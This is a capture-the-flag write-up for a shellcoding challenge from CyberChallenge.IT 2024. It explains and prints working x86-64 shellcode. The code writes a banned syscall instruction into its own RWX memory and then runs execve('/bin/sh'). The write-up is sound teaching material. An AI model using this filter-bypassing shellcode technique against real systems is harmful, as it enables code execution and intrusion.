# CyberChallenge.IT 2024 - University CTF

## [binary] Shellcoder (31 solves)

Show me your skills.

`nc shellcoder.challs.external.open.ecsc2024.it 38201`

Author: Giulia Martino <@Giulia>

## Overview

This is a shellcoding challenge. The challenge starts by `mmap`ing a region of memory as RWX at a fixed address `0xbeef0000`, which will be used to store the user provided shellcode. The shellcode cannot contain any syscall-like instruction. Before jumping inside the shellcode memory area, the challenge zeroes out all the registers.

## Solution

Considering the flag is on the filesystem, the easiest way to solve this challenge is by spwning a shell and then read the flag. A possible way consists in executing the syscall `execve(addr of /bin/sh, 0x0, 0x0)`. This means we need to:

1. set `rax` to 0x3b (`execve` syscall number)
2. set `rdi` to the address of the string `/bin/sh\x00` (`cmd` parameter)
3. set `rsi` to 0x0 (`argv` parameter)
4. set `rdx` to 0x0 (`envp` parameter)
5. execute a `syscall` instruction

The first 3 requirements are very straightforward to obtain with simple assembly instructions:

```asm
    mov rax, 0x3b;
    xor rsi, rsi;
    xor rdx, rdx;
```

To get the 4th requirement, we can place the `/bin/sh\x00` string at a fixed position in the shellcode itself; considering we know where the shellcode will be stored in memory, we also know where the `/bin/sh\x00` string will be. For example, we can place it `0x100` bytes after the start of the shellcode, and set `rdi = 0xbeef0100`.

```asm
    mov rdi, 0xbeef0100;
```

We're only missing a syscall instruction, which we cannot directly put in the shellcode because it is banned by the challenge. But we can easily workaround this issue because the region where the shellcode is stored is `mmap`ped as RWX, which means we can build a shellcode which writes the syscall instruction inside itself. So the finall shellcode is:

```python
shellcode = f"""
    mov rax, 0x3b;
    xor rsi, rsi;
    xor rdx, rdx;
    mov rdi, 0xbeef0100;
    mov r10, 0xbeef0032;
    mov r11, 0x0500;
    add r11, 0x0f;
    mov qword ptr [r10], r11;
"""
shellcode = asm(shellcode)
shellcode += b"\x90" * (0x100 - len(shellcode)) + b"/bin/sh\x00"
```

where the last four instructions are setting `r11` equal to the bytes corresponding to a syscall instruction (consider little endian) and then are moving those values at the address `0xbeef0032`. The shellcode is padded with a lot of NOP instructions (`\x90`), so the `syscall` instruction ends up in the middle of the NOP sled.

## Exploit

Take a look at the full exploit [here](checker/__main__.py).
